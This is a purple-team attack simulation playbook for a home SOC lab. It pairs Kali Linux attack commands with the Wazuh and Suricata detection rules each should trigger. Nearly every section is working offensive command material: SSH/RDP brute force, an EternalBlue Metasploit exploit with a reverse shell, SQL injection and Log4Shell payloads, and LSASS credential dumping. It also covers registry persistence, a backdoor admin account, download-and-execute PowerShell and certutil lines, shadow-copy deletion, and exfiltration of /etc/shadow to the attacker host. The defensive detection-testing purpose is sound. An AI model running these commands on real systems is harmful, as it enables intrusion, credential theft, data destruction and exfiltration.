# Attack Simulation Playbook — Kali Linux

This document is a **structured purple-team playbook** for the SOC lab.
Every command runs from the Kali attacker VM (`192.168.56.20`) against
lab VMs only (`192.168.56.0/24`). After each phase, verify the corresponding
Wazuh detection rule fired using the validation queries provided.

> ⚠️ **Authorization reminder:** These techniques are to be run exclusively
> inside the isolated `192.168.56.0/24` host-only network against VMs you
> own. Never use against systems without explicit written authorization.

---

## Phase 0 — Pre-Attack Setup

```bash
# Confirm you are on the correct interface (host-only network)
ip addr show eth1
# Expected: inet 192.168.56.20/24

# Verify all lab hosts are reachable
ping -c2 192.168.56.10   # SIEM
ping -c2 192.168.56.30   # Windows victim
ping -c2 192.168.56.40   # Web server

# Start Metasploit database
sudo systemctl start postgresql
msfdb init
```

---

## Phase 1 — Reconnaissance

### 1.1 Host Discovery

```bash
# ARP sweep — fast, network-layer discovery
sudo arp-scan --interface=eth1 192.168.56.0/24

# Nmap ping sweep
nmap -sn 192.168.56.0/24
```

### 1.2 Port Scanning (triggers Wazuh rule 100014 / Suricata SID 9000001)

```bash
# TCP SYN scan — fast, stealthy
sudo nmap -sS -T4 -p 1-65535 192.168.56.10 -oN nmap_siem_full.txt

# Service/version detection
sudo nmap -sV -sC -p 22,80,443,445,3389,5601,9000,9200,55000 \
  192.168.56.0/24 -oN nmap_services.txt

# OS fingerprinting
sudo nmap -O 192.168.56.30 -oN nmap_os_win.txt
```

**Verify detection:**
```bash
# On SIEM server — should see Suricata alert
sudo tail -20 /var/log/suricata/fast.log | grep -i scan
```

### 1.3 Vulnerability Scanning

```bash
# Lightweight vuln scan with Nmap scripts
sudo nmap --script vuln -p 445,80,443 192.168.56.30 -oN nmap_vulns.txt

# Check for EternalBlue (MS17-010) on Windows victim
sudo nmap --script smb-vuln-ms17-010 -p 445 192.168.56.30
```

---

## Phase 2 — Credential Attacks

### 2.1 SSH Brute Force (triggers Wazuh rule 100001 / Suricata SID 9000002)

```bash
# Hydra dictionary attack
hydra -l root -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt \
  -t 4 -f ssh://192.168.56.40

# Medusa alternative
medusa -h 192.168.56.40 -u ubuntu -P /usr/share/wordlists/rockyou.txt \
  -M ssh -t 4

# Targeted username list
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/seclists/Passwords/Common-Credentials/best110.txt \
  -t 4 ssh://192.168.56.40
```

**Verify detection:**
```bash
curl -sk -u admin:SecretPassword1! \
  "https://192.168.56.10:9200/wazuh-alerts-*/_search?q=rule.id:100001&size=1&pretty"
```

### 2.2 RDP Brute Force — Windows Victim (triggers Wazuh rule 100003 / Suricata SID 9000004)

```bash
# Crowbar RDP brute force
crowbar -b rdp -s 192.168.56.30/32 -u administrator \
  -C /usr/share/seclists/Passwords/Common-Credentials/best110.txt

# Hydra RDP
hydra -l administrator -P /usr/share/wordlists/rockyou.txt \
  -t 1 rdp://192.168.56.30
```

### 2.3 SMB Credential Testing

```bash
# Enumerate SMB shares
smbclient -L //192.168.56.30 -N
enum4linux -a 192.168.56.30

# Password spray (one password across many users — avoids lockout)
crackmapexec smb 192.168.56.30 -u users.txt -p 'Password123!' \
  --continue-on-success
```

### 2.4 FTP Brute Force

```bash
hydra -l anonymous -P /usr/share/wordlists/rockyou.txt \
  -t 8 ftp://192.168.56.40
```

---

## Phase 3 — Exploitation

### 3.1 EternalBlue (MS17-010) — Windows Victim

```bash
msfconsole -q << 'MSF'
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.30
set LHOST 192.168.56.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LPORT 4444
exploit
MSF
```

**Verify Suricata caught the payload delivery (SID 9000003):**
```bash
sudo grep "Meterpreter\|4444" /var/log/suricata/fast.log
```

### 3.2 Web Application — SQL Injection (triggers Wazuh rule 100020)

```bash
# Manual SQLi test
curl -s "http://192.168.56.40/login?user=admin'--&pass=x"
curl -s "http://192.168.56.40/search?q=1' UNION SELECT null,username,password FROM users--"

# Automated with sqlmap
sqlmap -u "http://192.168.56.40/search?q=test" \
  --dbs --batch --level=3 --risk=2 \
  --output-dir=/tmp/sqlmap_output/

# sqlmap POST request
sqlmap -u "http://192.168.56.40/login" \
  --data="username=admin&password=test" \
  --dbs --batch
```

### 3.3 Log4Shell — Web Server (triggers Wazuh rule 100019)

```bash
# Start JNDI listener (receives the callback)
python3 -m pip install git+https://github.com/fullhunt/log4j-scan
python3 log4j-scan.py -u http://192.168.56.40

# Manual payload in HTTP headers
curl -H 'X-Api-Version: ${jndi:ldap://192.168.56.20:1389/a}' \
  http://192.168.56.40/
curl -A '${jndi:ldap://192.168.56.20:1389/a}' \
  http://192.168.56.40/
```

---

## Phase 4 — Post-Exploitation (Windows Victim — via Meterpreter)

> Run these inside an active Meterpreter session on `win10-victim`.
> All commands trigger specific Wazuh/Sysmon rules.

### 4.1 Situational Awareness

```
meterpreter> sysinfo
meterpreter> getuid
meterpreter> ps
meterpreter> shell
```

### 4.2 Credential Dumping — Mimikatz (triggers Wazuh rule 100013)

```
meterpreter> load kiwi
meterpreter> creds_all
meterpreter> lsa_dump_sam
meterpreter> lsa_dump_secrets
```

Windows shell alternative:
```cmd
# Using built-in rundll32 (LOLBin) — triggers rule 100013 via Sysmon EventID 10
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Windows\Temp\lsass.dmp full
```

### 4.3 Persistence — Registry Run Key (triggers Wazuh rule 100015)

```cmd
# Add malicious persistence via Run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
  /v "WindowsUpdater" /d "C:\Windows\Temp\update.exe" /f

# Verify it was written
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

### 4.4 Local Privilege Escalation — New Admin Account (triggers rules 100009 + 100010)

```cmd
# Create backdoor user (EventID 4720)
net user backdooruser "P@ssw0rd123!" /add

# Add to local administrators (EventID 4732)
net localgroup administrators backdooruser /add

# Verify
net user backdooruser
net localgroup administrators
```

### 4.5 Lateral Movement — WMIC (triggers Wazuh rule 100008)

```cmd
# Execute process on remote host via WMIC
wmic /node:"192.168.56.40" /user:"admin" /password:"password" ^
  process call create "cmd.exe /c whoami > C:\Temp\output.txt"
```

### 4.6 Defense Evasion — Certutil Download (triggers Wazuh rule 100006)

```cmd
# Download file via certutil (LOLBin)
certutil.exe -urlcache -split -f "http://192.168.56.20/payload.exe" ^
  C:\Windows\Temp\update.exe

# Certutil base64 decode (obfuscation)
certutil.exe -decode C:\Temp\encoded.txt C:\Temp\decoded.exe
```

### 4.7 PowerShell Obfuscation (triggers Wazuh rule 100005)

```powershell
# Encoded command execution
$cmd = 'Invoke-WebRequest -Uri http://192.168.56.20/stage2.ps1 -UseBasicParsing | IEX'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encoded

# AMSI bypass attempt (for completeness — triggers behavioral rules)
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden ^
  -Command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.20/amsi.ps1')"
```

### 4.8 Ransomware Simulation — Shadow Copy Deletion (triggers Wazuh rule 100012)

```cmd
:: Delete shadow copies (classic ransomware pre-stage)
:: CAUTION: Run only on disposable lab VM with snapshot taken
vssadmin.exe delete shadows /all /quiet
wmic shadowcopy delete
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled no
```

---

## Phase 5 — Exfiltration Simulation

### 5.1 DNS Tunneling Simulation (triggers Suricata SID 9000005)

```bash
# High-volume DNS queries simulating data exfiltration via DNS
# Each query encodes a chunk of "data" as a subdomain
for i in $(seq 1 60); do
  nslookup "$(head -c 20 /dev/urandom | base64 | tr -d '=+/' | head -c 16).evil.example.com" \
    192.168.56.10 &
done
wait
```

### 5.2 HTTP Exfiltration via cURL

```bash
# Simulate staged data exfil over HTTP
tar czf - /etc/passwd /etc/shadow 2>/dev/null | \
  base64 | \
  curl -s -X POST http://192.168.56.20:8080/upload \
    -H "Content-Type: application/octet-stream" \
    --data-binary @-
```

---

## Phase 6 — Honeypot Interaction (triggers Wazuh rule 100017)

```bash
# Interact with Cowrie SSH honeypot on SIEM server (port 2222)
sshpass -p "password" ssh -o StrictHostKeyChecking=no \
  -p 2222 root@192.168.56.10

# Inside the fake shell — these commands are logged by Cowrie
# whoami
# cat /etc/passwd
# wget http://192.168.56.20/malware.sh
# exit
```

---

## Detection Validation Queries

After each phase, verify alerts reached the Wazuh Indexer:

```bash
# Quick summary of all custom rule hits from the last hour
curl -sk -u admin:SecretPassword1! \
  "https://192.168.56.10:9200/wazuh-alerts-*/_search" \
  -H "Content-Type: application/json" -d '{
    "query":{"bool":{"must":[
      {"range":{"timestamp":{"gte":"now-1h"}}},
      {"range":{"rule.id":{"gte":100001,"lte":100020}}}
    ]}},
    "aggs":{"by_rule":{"terms":{"field":"rule.id","size":25}}},
    "size":0
  }' | python3 -m json.tool | grep -A2 '"key"'
```

Expected fired rules by phase:

| Phase | Wazuh Rule IDs | Suricata SIDs |
|---|---|---|
| 1 — Recon | 100014 | 9000001 |
| 2 — Credential attacks | 100001, 100002, 100003 | 9000002, 9000004 |
| 3 — Exploitation | 100013, 100019, 100020 | 9000003, 9000006 |
| 4 — Post-exploitation | 100005, 100006, 100007, 100008, 100009, 100010, 100012, 100015 | — |
| 5 — Exfiltration | — | 9000005 |
| 6 — Honeypot | 100017 | — |

---

## Cleanup After Exercise

```bash
# Remove backdoor user (Windows victim — PowerShell as Admin)
# net user backdooruser /delete
# reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdater" /f
# del C:\Windows\Temp\update.exe C:\Windows\Temp\lsass.dmp

# Restore VM snapshots for clean-slate
vagrant snapshot restore siem   04siem-clean
vagrant snapshot restore victim 04siem-clean

# Clear Suricata fast.log for next run
sudo truncate -s 0 /var/log/suricata/fast.log
```